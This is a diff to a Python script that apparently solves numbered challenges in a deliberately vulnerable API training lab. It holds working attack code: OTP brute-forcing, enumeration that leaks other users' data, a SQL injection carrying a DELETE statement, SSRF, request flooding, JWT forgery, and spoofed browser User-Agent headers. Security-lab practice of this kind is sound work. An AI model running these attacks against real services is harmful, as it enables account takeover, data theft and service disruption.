@@ -9,6 +9,7 @@ from rich.console import Console
 from rich.table import Table
 import jwt.algorithms
 import jwt
+from tqdm import tqdm
 
 # Global variables
 ip_address = ""
@@ -42,6 +43,16 @@ logging.basicConfig(level=logging.INFO,
                     ])
 
 
+def get_mock_user_agent_name() -> str:
+    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+
+
+def get_mock_user_agent_header() -> dict:
+    return {
+        "User-Agent": get_mock_user_agent_name()
+    }
+
+
 def signup(name, email, phone_number, password) -> int:
     url = f"http://{ip_address}:{web_port}/identity/api/auth/signup"
     data = {
@@ -50,7 +61,8 @@ def signup(name, email, phone_number, password) -> int:
         "number": phone_number,
         "password": password
     }
-    response = requests.post(url, json=data)
+    response = requests.post(
+        url, headers=get_mock_user_agent_header(), json=data)
     if response.status_code != 200:
         logging.error(f"Failed to signup: {
                       response.status_code} - {response.text}")
@@ -59,7 +71,7 @@ def signup(name, email, phone_number, password) -> int:
 
 def readmail() -> requests.Response:
     url = f"http://{ip_address}:{mail_port}/api/v2/messages?limit=50"
-    response = requests.get(url)
+    response = requests.get(url, headers=get_mock_user_agent_header())
     if response.status_code != 200:
         logging.error(
             f"Failed to read e-mail portal: {response.status_code} - {response.text}")
@@ -73,7 +85,8 @@ def login(username, password) -> requests.Response:
         "password": password
     }
 
-    response = requests.post(url, json=data)
+    response = requests.post(
+        url, headers=get_mock_user_agent_header(), json=data)
     if response.status_code != 200:
         logging.error(f"Failed to login: {
                       response.status_code} - {response.text}")
@@ -110,7 +123,8 @@ def parse_email_response(response) -> dict:
 def read_recent_posts(token) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/community/api/v2/community/posts/recent"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.get(url, headers=headers)
     if response.status_code != 200:
@@ -132,7 +146,8 @@ def parse_recent_posts_response(response) -> dict:
 def upload_video(token, video_name) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/identity/api/v2/user/videos"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     files = {
         "file": open(video_name, "rb")
@@ -150,6 +165,7 @@ def query_location(token, vehicleid) -> requests.Response:
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
         "Accept": "application/json",
+        "User-Agent": get_mock_user_agent_name()
 
     }
     response = requests.get(url, headers=headers)
@@ -163,6 +179,7 @@ def provision_vehicle(token, vin, pincode) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/identity/api/v2/vehicle/add_vehicle"
     headers = {
         "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "vin": vin,
@@ -178,7 +195,8 @@ def provision_vehicle(token, vin, pincode) -> requests.Response:
 def contact_mechanic(token, vin, report_url, repeat_request_if_failed=False, number_of_repeats=1) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/merchant/contact_mechanic"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "mechanic_code": "TRAC_JHN",
@@ -196,7 +214,8 @@ def contact_mechanic(token, vin, report_url, repeat_request_if_failed=False, num
 def query_report(token, report_base_url, report_id) -> requests.Response:
     url = f"{report_base_url}={report_id}"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.get(url, headers=headers)
     if response.status_code == 200:
@@ -209,7 +228,8 @@ def forget_password(email) -> requests.Response:
     data = {
         "email": email
     }
-    response = requests.post(url, json=data)
+    response = requests.post(
+        url, headers=get_mock_user_agent_header(), json=data)
     if response.status_code != 200:
         logging.error(f"Failed to forget password: {
             response.status_code} - {response.text}")
@@ -224,7 +244,8 @@ def check_otp_password_brute_v2(email, token, otp) -> requests.Response:
         "password": "P4ssw0rd@"
     }
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.post(url, headers=headers, json=data)
     if response.status_code == 200:
@@ -237,6 +258,7 @@ def get_video(token, video_id) -> requests.Response:
     headers = {
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.get(url, headers=headers)
     return response
@@ -247,6 +269,7 @@ def delete_video(token, video_id) -> requests.Response:
     headers = {
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "videoName": "SampleVideo_1280x720_1mb.mp4"
@@ -261,7 +284,8 @@ def delete_video(token, video_id) -> requests.Response:
 def show_products(token) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/shop/products"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.get(url, headers=headers)
     if response.status_code != 200:
@@ -273,7 +297,8 @@ def show_products(token) -> requests.Response:
 def buy_products(token, product_id, quantity) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/shop/orders"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "product_id": product_id,
@@ -290,7 +315,8 @@ def buy_products(token, product_id, quantity) -> requests.Response:
 def rewrite_order_id(token, product_id, quantity, order_id) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/shop/orders/{order_id}"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "product_id": product_id,
@@ -307,7 +333,8 @@ def refund_order_id(token, order_id) -> requests.Response:
     url = f"http://{ip_address}:{
         web_port}/workshop/api/shop/orders/return_order?order_id={order_id}"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.post(url, headers=headers)
     if response.status_code != 200:
@@ -319,7 +346,8 @@ def refund_order_id(token, order_id) -> requests.Response:
 def add_mock_product(token, name, price, image_url) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/shop/products"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "name": name,
@@ -336,7 +364,8 @@ def add_mock_product(token, name, price, image_url) -> requests.Response:
 def get_user_dashboard(token) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/identity/api/v2/user/dashboard"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.get(url, headers=headers)
     if response.status_code != 200:
@@ -348,7 +377,8 @@ def get_user_dashboard(token) -> requests.Response:
 def update_dashboard_video_properties(token, video_id, video_name) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/identity/api/v2/user/videos/{video_id}"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
 
     data = {
@@ -365,7 +395,8 @@ def update_dashboard_video_properties(token, video_id, video_name) -> requests.R
 def discover_coupon(token: str, data: Dict) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/community/api/v2/coupon/validate-coupon"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.post(url, headers=headers, json=data)
     if response.status_code != 200:
@@ -377,7 +408,8 @@ def discover_coupon(token: str, data: Dict) -> requests.Response:
 def redeem_coupon(token: str, coupon_code: str, amount: str) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/community/api/v2/coupon/new-coupon"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"Bearer {token}",
+        "User-Agent": get_mock_user_agent_name()
     }
     data = {
         "coupon_code": coupon_code,
@@ -420,7 +452,7 @@ def list_unauthenticated_operations(openapi_spec: dict):
 
 def read_qr_code() -> requests.Response:
     url = f"http://{ip_address}:{web_port}/workshop/api/shop/return_qr_code"
-    response = requests.get(url)
+    response = requests.get(url, headers=get_mock_user_agent_header())
     if response.status_code != 200:
         logging.error(f"Failed to read QR code: {
             response.status_code} - {response.text}")
@@ -464,7 +496,8 @@ def login_with_token(token, email) -> requests.Response:
     url = f"http://{ip_address}:{web_port}/identity/api/auth/v4.0/user/login-with-token"
     headers = {
         "email": email,
-        "token": token
+        "token": token,
+        "User-Agent": get_mock_user_agent_name()
     }
     response = requests.post(url, headers=headers)
     if response.status_code != 200:
@@ -528,22 +561,23 @@ def main():
     # ##############
     # CHALLENGE 1
     # ##############
-    response = read_recent_posts(nico_token)
-    email_vehicleid = parse_recent_posts_response(response)
     other_user = ""
+    response = read_recent_posts(nico_token)
+    if response.status_code == 200:
+        email_vehicleid = parse_recent_posts_response(response)
 
-    logging.debug("Email VehicleID:", email_vehicleid)
+        logging.debug("Email VehicleID:", email_vehicleid)
 
-    for email, vehicleid in email_vehicleid.items():
-        response = query_location(nico_token, vehicleid)
-        if response.status_code == 200:
-            logging.info(f"Location for user {email}: {
-                response.json()['vehicleLocation']}")
-            other_user = email
-            results["ch1"]["status"] = "passed"
-            results["ch1"]["message"] = f"Location for user {
-                email}: {response.json()['vehicleLocation']}"
-            break
+        for email, vehicleid in email_vehicleid.items():
+            response = query_location(nico_token, vehicleid)
+            if response.status_code == 200:
+                logging.info(f"Challenge #1: Location for user {email}: {
+                    response.json()['vehicleLocation']}")
+                other_user = email
+                results["ch1"]["status"] = "passed"
+                results["ch1"]["message"] = f"Location for user {
+                    email}: {response.json()['vehicleLocation']}"
+                break
 
     # ######################
     # # CHALLENGE 2 and 4
@@ -569,34 +603,34 @@ def main():
         logging.error(f"Failed to provision vehicle for Nico: {
                       response.status_code}")
 
+    stolen_email = ""
     # Contact mechanic for Nico to get a report link
     response = contact_mechanic(
         nico_token, email_data[nico_email]["VIN"], mechanic_report_url, False)
     if response.status_code != 200:
-        logging.error(f"Failed to get report ID for {
-            email}: {response.status_code}")
-
-    stolen_email = ""
-    # Extract the report_link
-    report_link = response.json()['response_from_mechanic_api']['report_link']
-    # Print the report_link
-    report_parts = report_link.split("=")
-    report_id = report_parts[-1]
-    report_base_url = report_parts[0]
-    for id in 1, report_id * 2:
-        if id != report_id:
-            response = query_report(nico_token, report_base_url, id)
-            if response.status_code == 200:
-                logging.info(f"Leaked report {id} from user {
-                    response.json()['vehicle']['owner']['email']}")
-                results["ch2"]["status"] = "passed"
-                results["ch2"]["message"] = f"Leaked report {id} from user {
-                    response.json()['vehicle']['owner']['email']}"
-                results["ch4"]["status"] = "passed"
-                results["ch4"]["message"] = f"Leaked phone number {response.json(
-                )['vehicle']['owner']['number']} from user {response.json()['vehicle']['owner']['email']}"
-                # we'll use stolen e-mail in next challenge
-                stolen_email = response.json()['vehicle']['owner']['email']
+        logging.error(f"Failed to get report ID: {response.status_code}")
+    else:
+        # Extract the report_link
+        report_link = response.json(
+        )['response_from_mechanic_api']['report_link']
+        # Print the report_link
+        report_parts = report_link.split("=")
+        report_id = report_parts[-1]
+        report_base_url = report_parts[0]
+        for id in 1, report_id * 2:
+            if id != report_id:
+                response = query_report(nico_token, report_base_url, id)
+                if response.status_code == 200:
+                    logging.info(f"Challenge #2 and #4: Leaked report {id} from user {
+                        response.json()['vehicle']['owner']['email']}")
+                    results["ch2"]["status"] = "passed"
+                    results["ch2"]["message"] = f"Leaked report {id} from user {
+                        response.json()['vehicle']['owner']['email']}"
+                    results["ch4"]["status"] = "passed"
+                    results["ch4"]["message"] = f"Leaked phone number {response.json(
+                    )['vehicle']['owner']['number']} from user {response.json()['vehicle']['owner']['email']}"
+                    # we'll use stolen e-mail in next challenge
+                    stolen_email = response.json()['vehicle']['owner']['email']
 
     # ##############
     # CHALLENGE 3
@@ -614,11 +648,13 @@ def main():
             response.status_code}"
 
     # Iterate between '0000' and '9999' to check OTP
-    for otp in range(0, 10000):
+    for otp in tqdm(range(0, 10000), desc="Brute-forcing OTP"):
         otp = f"{otp:04}"
+        logging.debug(f"Checking OTP {otp}")
         response = check_otp_password_brute_v2(stolen_email, nico_token, otp)
         if response.status_code == 200:
-            logging.info(f"OTP {otp} is correct for {stolen_email}")
+            logging.info(f"Challenge #3: OTP {
+                         otp} is correct for {stolen_email}")
             results["ch3"]["status"] = "passed"
             results["ch3"]["message"] = f"Password invalidated for {
                 stolen_email}"
@@ -634,7 +670,7 @@ def main():
         response = get_video(inaki_token, id)
         if response.status_code == 200:
             inaki_video_id = id
-            logging.info(f"EDA challenge #5, Video for Inaki: id:{response.json()["id"]} video_name: {response.json()[
+            logging.info(f"Challenge #5, Video for Inaki: id:{response.json()["id"]} video_name: {response.json()[
                 "video_name"]} conversion_params: {response.json()["conversion_params"]}")
             results["ch5"]["status"] = "passed"
             results["ch5"]["message"] = f"Conversion params leaked: '{
@@ -648,7 +684,8 @@ def main():
     response = contact_mechanic(
         nico_token, email_data[nico_email]["VIN"] + "9", mechanic_report_url, True, 10000)
     if response.status_code != 200:
-        logging.info(f"Error when contacting mechanic due to DoS attack:")
+        logging.info(
+            f"Challenge #6: Error when contacting mechanic due to DoS attack:")
         results["ch6"]["status"] = "passed"
         results["ch6"]["message"] = f"Rate limit exceeded (error code: {
             response.status_code})"
@@ -661,7 +698,7 @@ def main():
     response = delete_video(nico_token, inaki_video_id)
     if response.status_code == 200:
         logging.info(
-            f"Broken Function Access Level challenge #7: Deleted Inaki's video with Nico's JWT")
+            f"Challenge #7: Deleted Inaki's video with Nico's JWT")
         results["ch7"]["status"] = "passed"
         results["ch7"]["message"] = f"Other user's video with id {
             inaki_video_id} deleted"
@@ -672,45 +709,45 @@ def main():
     # ##############
     # CHALLENGE 8
     # ##############
-
+    order_id = ""
     # Shop products
     response = show_products(nico_token)
     if response.status_code == 200:
         logging.debug(f"Available products: {response.json()}")
+        product_id = response.json()['products'][0]["id"]
+        # For next challenge
+        product_image_url = response.json()['products'][0]["image_url"]
+        # Nico buys
+        response = buy_products(nico_token, product_id, 1)
+        if response.status_code == 200:
+            logging.info(f"Product bought: {response.json()}")
+            # Save order ID for next challenge and challenge #14
+            order_id = response.json()["id"]
+            # Rewrite order without consuming credit
+            response = rewrite_order_id(nico_token, product_id, 4, order_id)
+            if response.status_code == 200:
+                logging.info(f"Rewrite order ID: {
+                             response.json()["orders"]["id"]}")
+                # Refund
+                response = refund_order_id(nico_token, order_id)
+                if response.status_code == 200:
+                    logging.info(f"Challenge #8: Refunded order: {
+                                 response.json()["message"]}")
+                    results["ch8"]["status"] = "passed"
+                    results["ch8"]["message"] = f"Item refunded: quantity={
+                        response.json()["order"]["quantity"]} and status={response.json()["order"]["status"]}"
+                else:
+                    print(f"Failed to refund order ID: {
+                        response.status_code} {response.text}")
+            else:
+                print(f"Failed to rewrite order ID: {
+                    response.status_code} {response.text}")
+        else:
+            logging.error(f"Failed to buy product: {
+                response.status_code} {response.text}")
     else:
         logging.error(f"There are no available roducts: {
             response.status_code} {response.text}")
-
-    product_id = response.json()['products'][0]["id"]
-    # For next challenge
-    product_image_url = response.json()['products'][0]["image_url"]
-    # Nico buys
-    response = buy_products(nico_token, product_id, 1)
-    if response.status_code == 200:
-        logging.info(f"Product bought: {response.json()}")
-    else:
-        logging.error(f"Failed to buy product: {
-                      response.status_code} {response.text}")
-    # Save order ID for next challenge and challenge #14
-    order_id = response.json()["id"]
-    # Rewrite order without consuming credit
-    response = rewrite_order_id(nico_token, product_id, 4, order_id)
-    if response.status_code == 200:
-        logging.info(f"Rewrite order ID: {response.json()["orders"]["id"]}")
-    else:
-        print(f"Failed to rewrite order ID: {
-              response.status_code} {response.text}")
-
-    # Refund
-    response = refund_order_id(nico_token, order_id)
-    if response.status_code == 200:
-        logging.info(f"Refunded order: {response.json()["message"]}")
-        results["ch8"]["status"] = "passed"
-        results["ch8"]["message"] = f"Item refunded: quantity={
-            response.json()["order"]["quantity"]} and status={response.json()["order"]["status"]}"
-    else:
-        print(f"Failed to refund order ID: {
-              response.status_code} {response.text}")
 
     # ##############
     # CHALLENGE 9
@@ -729,7 +766,7 @@ def main():
     # Buy the mock product
     response = buy_products(nico_token, mock_product_id, 1)
     if response.status_code == 200:
-        logging.info(f"BFLA challenge 9: Increase your balance: {
+        logging.info(f"Challenge #9: Increase your balance: {
                      response.json()}")
         results["ch9"]["status"] = "passed"
         results["ch9"]["message"] = f"Balance increased to: {
@@ -753,7 +790,7 @@ def main():
     response = update_dashboard_video_properties(
         nico_token, video_id, "Play_me_if_you_can.mp4")
     if response.status_code == 200:
-        logging.info(f"Updated dashboard video properties: {
+        logging.info(f"Challenge #10: Updated dashboard video properties: {
             response.json()["video_name"]}")
         results["ch10"]["status"] = "passed"
         results["ch10"]["message"] = f"Video name updated to: {
@@ -769,7 +806,7 @@ def main():
     response = contact_mechanic(
         nico_token, email_data[nico_email]["VIN"], find_my_ip_url)
     if response.status_code == 200:
-        logging.info(f"SSRF challenge 11: Sent HTTP request to {
+        logging.info(f"Challenge #11: Sent HTTP request to {
             find_my_ip_url} and received response {response.status_code}")
         unknown_ip_address = extract_ip_address(response.text)
         results["ch11"]["status"] = "passed"
@@ -795,7 +832,7 @@ def main():
         amount = response.json()["amount"]
         response = redeem_coupon(nico_token, coupon_code, amount)
         if response.status_code == 200:
-            logging.info(f"Redeemed coupon: {response.json()}")
+            logging.info(f"Challenge #12: Redeemed coupon: {response.json()}")
             results["ch12"]["status"] = "passed"
             results["ch12"]["message"] = f"Discovered and reedemed coupon {
                 coupon_code} with amount {amount}"
@@ -810,7 +847,7 @@ def main():
         coupon_code}';DELETE FROM applied_coupon WHERE coupon_code='{coupon_code}';--"
     response = redeem_coupon(nico_token, sql_injection, amount)
     if response.status_code == 200:
-        logging.info(f"SQL Injection challenge 13: {
+        logging.info(f"Challenge #13: SQL Injection: {
             response.json()}")
         results["ch13"]["status"] = "passed"
         results["ch13"]["message"] = f"Reactivated coupon {coupon_code}: {
@@ -832,6 +869,7 @@ def main():
                      unauthenticated_operations}")
         response = read_qr_code()
         if response.status_code == 200:
+            logging.info(f"Challenge #14: Unauthenticated operations")
             results["ch14"]["status"] = "passed"
             results["ch14"]["message"] = f"Unauthenticated operations: {
                 len(unauthenticated_operations)}. QR code read successfully"
@@ -843,7 +881,6 @@ def main():
     # CHALLENGE 15
     # ###############
     # Decode a JWT token
-    print(nico_token)
     header, payload, signature = nico_token.split('.')
     # Decode the header and payload
     header_decoded = base64.urlsafe_b64decode(header + "==").decode('utf-8')
@@ -869,7 +906,7 @@ def main():
 
     response = get_user_dashboard(new_token)
     if response.status_code == 200:
-        logging.info(f"JWT vulnerabilities challenge 15: {
+        logging.info(f"Challenge # 15: {
             response.json()}")
         results["ch15"]["status"] = "passed"
         results["ch15"]["message"] = f"Accessed other user's dashboard: {
